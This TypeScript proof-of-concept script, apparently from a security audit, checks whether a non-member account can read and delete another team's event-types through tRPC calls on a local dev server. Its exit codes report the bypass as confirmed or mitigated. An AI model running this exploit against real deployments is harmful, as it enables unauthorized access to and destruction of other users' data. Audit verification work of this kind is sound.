#!/usr/bin/env -S npx tsx
/**
 * PoC SEC-001 — PBAC bypass IDOR on team event-types.
 *
 * Hypothesis: `PermissionCheckService.checkPermission` always returns `true`
 * (see packages/trpc/server/routers/viewer/eventTypes/util.ts:15-20). A user
 * who is NOT a member of team T can still call:
 *   - eventTypes.get({ id: <team-event-id> })
 *   - eventTypes.delete({ id: <team-event-id> })
 *   - eventTypesHeavy.update(...)
 *   - …
 * on event-types belonging to T.
 *
 * Flow:
 *   1. Login as pro@example.com, ensure team + team event-type exist.
 *   2. Login as free@example.com (NOT a member of the team).
 *   3. free@ calls eventTypes.get + eventTypes.delete on the team event.
 *   4. Verify via pro@ session whether the event still exists in DB.
 *
 * Exit codes: 1 = vuln confirmed, 0 = mitigated, 2/3 = inconclusive/error.
 *
 * Usage:
 *   yarn workspace @calcom/web dev   # in another terminal
 *   npx tsx scripts/audit-poc/poc-sec-001.ts
 */

import { BASE, login, trpcMutation, trpcQuery, type Session } from "./_lib";

const TEAM_SLUG = "audit-poc-team";
const EVENT_SLUG = "audit-poc-event";

const OWNER_EMAIL = process.env.OWNER_EMAIL ?? "audit-poc-owner@local.test";
const OWNER_PASSWORD = process.env.OWNER_PASSWORD ?? "audit-poc-owner-pw";
const ATTACKER_EMAIL = process.env.ATTACKER_EMAIL ?? "audit-poc-attacker@local.test";
const ATTACKER_PASSWORD = process.env.ATTACKER_PASSWORD ?? "audit-poc-attacker-pw";

async function ensureTeam(sess: Session): Promise<number> {
  const created = await trpcMutation<{ id: number; slug: string }>(sess, "teams.create", {
    name: "Audit PoC Team",
    slug: TEAM_SLUG,
  });
  if (created.ok && created.data) return created.data.id;
  if (created.error?.code === "CONFLICT") {
    // Team already exists — look it up via teams.list
    const list = await trpcQuery<Array<{ team: { id: number; slug: string | null } }>>(
      sess,
      "teams.list",
      {}
    );
    const found = list.data?.find((m) => m.team.slug === TEAM_SLUG);
    if (!found) throw new Error(`team '${TEAM_SLUG}' missing despite CONFLICT response`);
    return found.team.id;
  }
  throw new Error(
    `teams.create failed: status=${created.status} code=${created.error?.code} msg=${created.error?.message}`
  );
}

async function ensureTeamEvent(sess: Session, teamId: number): Promise<number> {
  const created = await trpcMutation<{ eventType: { id: number; slug: string } } | { id: number }>(
    sess,
    "eventTypesHeavy.create",
    {
      title: "Audit PoC Event",
      slug: EVENT_SLUG,
      length: 30,
      hidden: false,
      teamId,
      schedulingType: "COLLECTIVE",
    }
  );
  if (created.ok && created.data) {
    const id =
      (created.data as { eventType?: { id: number } }).eventType?.id ??
      (created.data as { id?: number }).id;
    if (id) return id;
  }
  if (created.error?.message?.toLowerCase().includes("url") || created.error?.code === "CONFLICT") {
    // Likely already exists — find it via eventTypes.getByViewer with teamId filter.
    const list = await trpcQuery<{ eventTypeGroups: Array<{ teamId?: number | null; eventTypes: Array<{ id: number; slug: string }> }> }>(
      sess,
      "eventTypes.getByViewer",
      { filters: { teamIds: [teamId] }, forRoutingForms: false }
    );
    for (const group of list.data?.eventTypeGroups ?? []) {
      if (group.teamId === teamId) {
        const evt = group.eventTypes.find((e) => e.slug === EVENT_SLUG);
        if (evt) return evt.id;
      }
    }
  }
  throw new Error(
    `eventTypes.heavy.create failed: status=${created.status} code=${created.error?.code} msg=${created.error?.message}`
  );
}

async function main() {
  console.log("=== PoC SEC-001 — PBAC bypass on team event-types ===");
  console.log(`base = ${BASE}`);

  console.log(`[1] login owner=${OWNER_EMAIL}`);
  const pro = await login(OWNER_EMAIL, OWNER_PASSWORD);

  console.log("[2] ensure team");
  const teamId = await ensureTeam(pro);
  console.log(`    teamId = ${teamId}`);

  console.log("[3] ensure team event-type");
  const eventTypeId = await ensureTeamEvent(pro, teamId);
  console.log(`    eventTypeId = ${eventTypeId}`);

  console.log(`[4] login attacker=${ATTACKER_EMAIL} (NOT a member of the team)`);
  const free = await login(ATTACKER_EMAIL, ATTACKER_PASSWORD);

  console.log("[5] attacker calls eventTypes.get on the team event");
  const getRes = await trpcQuery(free, "eventTypes.get", { id: eventTypeId });
  console.log(`    status=${getRes.status} code=${getRes.error?.code ?? "OK"}`);
  if (getRes.ok) {
    console.log(`    leaked data keys: ${Object.keys((getRes.data as object) ?? {}).join(", ")}`);
  }

  console.log("[6] attacker calls eventTypes.delete on the team event");
  const delRes = await trpcMutation(free, "eventTypes.delete", { id: eventTypeId });
  console.log(`    status=${delRes.status} code=${delRes.error?.code ?? "OK"}`);

  console.log("[7] verify via owner session: does the event still exist?");
  const verifyRes = await trpcQuery(pro, "eventTypes.get", { id: eventTypeId });
  const stillExists = verifyRes.ok && !!verifyRes.data;
  console.log(`    exists in DB: ${stillExists}`);

  console.log("");
  const readLeaked = getRes.ok;
  const deletedByFree = delRes.ok && !stillExists;

  if (deletedByFree) {
    console.log(
      `[VULN CONFIRMED] attacker deleted team event ${eventTypeId} via HTTP ${delRes.status} — PBAC stub bypassed`
    );
    process.exit(1);
  }
  if (readLeaked && delRes.error?.code === "FORBIDDEN") {
    console.log(
      `[VULN PARTIAL] attacker read team event (HTTP ${getRes.status}) but delete blocked (HTTP ${delRes.status})`
    );
    process.exit(1);
  }
  if (delRes.status === 403 || delRes.error?.code === "FORBIDDEN") {
    console.log(
      `[MITIGATED] HTTP ${delRes.status} (${delRes.error?.code}) on delete — authorization enforced`
    );
    process.exit(0);
  }
  console.log(
    `[INCONCLUSIVE] get=${getRes.status}/${getRes.error?.code} delete=${delRes.status}/${delRes.error?.code} stillExists=${stillExists}`
  );
  console.log(`    delete raw: ${JSON.stringify(delRes.raw).slice(0, 600)}`);
  process.exit(2);
}

main().catch((e) => {
  console.error(`[ERROR] ${(e as Error).message}`);
  if ((e as Error).stack) console.error((e as Error).stack);
  process.exit(3);
});
